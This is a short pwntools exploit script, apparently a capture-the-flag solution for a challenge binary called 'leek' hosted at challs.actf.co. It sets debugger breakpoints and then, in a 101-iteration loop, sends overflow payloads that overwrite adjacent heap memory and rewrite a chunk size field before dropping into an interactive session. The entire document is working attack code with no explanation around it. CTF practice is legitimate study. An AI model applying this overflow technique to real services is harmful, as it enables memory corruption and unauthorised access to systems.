#!/usr/bin/python3

from pwn import *

exe = ELF('leek', checksec=False)
libc = ELF("./libc6_2.31-0ubuntu9.9_amd64.so")
ld = ELF("./ld-2.31.so")
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*main+431
                b*main+512
                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('challs.actf.co', 31310)

else:
    p = process(exe.path)

GDB()
for i in range(0, 101):
    print(i )
    payload = b'b' * 24 + p8(0x1)*8 + p8(0x1) * 32 + b"\0"
    sl(payload)
    payload = p8(0x1) * 32 + b"\0"
    s(payload)
    sl(b"\0" * 23 + p64(0x31))

p.interactive()
